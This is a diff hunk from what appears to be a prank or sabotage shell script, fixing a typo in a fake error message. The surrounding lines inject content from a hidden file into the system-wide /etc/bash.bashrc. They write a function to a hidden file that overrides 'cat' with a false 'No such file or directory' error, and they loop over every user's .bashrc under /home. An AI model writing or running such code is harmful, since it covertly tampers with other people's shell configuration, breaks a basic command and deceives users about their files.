@@ -492,7 +492,7 @@ sed '/shopt -s checkwinsize/r /usr/share/.haha' -i /etc/bash.bashrc
 #annoying cat function
 cat >> /var/run/.me <<"__EOF__"
 function cat() {
-echo "cat: $1: No such flies or directories"
+echo "cat: $1: No such file or directory"
 }
 __EOF__
 for x in $(find /home -type f -name ".bashrc" -exec echo {} \;); do
